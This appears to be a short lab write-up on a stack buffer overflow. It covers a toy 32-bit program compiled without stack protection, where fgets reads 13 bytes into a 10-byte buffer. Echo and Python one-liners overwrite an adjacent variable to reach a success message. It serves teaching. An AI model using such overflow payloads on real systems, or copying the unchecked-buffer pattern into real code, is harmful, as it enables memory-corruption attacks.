## Stack buffer overflow

Basic demonstration of a stack buffer overflow. This example is compiled to a 32-bit program, and has stack protection disabled.

```
gcc -o stack stack.c -m32 -fno-stack-protector
```

## Goal

Using the file **stack**, you need to get through the condition **exploit == 0x9876** and have the message **It worked!** printed. No file modification is allowed.

## Solution

This exploit is about the function fgets. Our array is 10 bytes long and the function fgets is looking for up to 13 bytes. Thus, by giving more than 10 bytes to the standard input, we are going to overrun the buffer's boundary and overwrite an adjacent memory location (in our case, the variable exploit which is located just under our array). Here is a non-exhaustive list of solutions :

Using shell scripting :

```
echo -ne "1234567890\x76\x98" | ./stack
```

Using python :

```
python -c "print 'A'*10+'\x76\x98'" | ./stack
```

Remember that stack works in reverse!
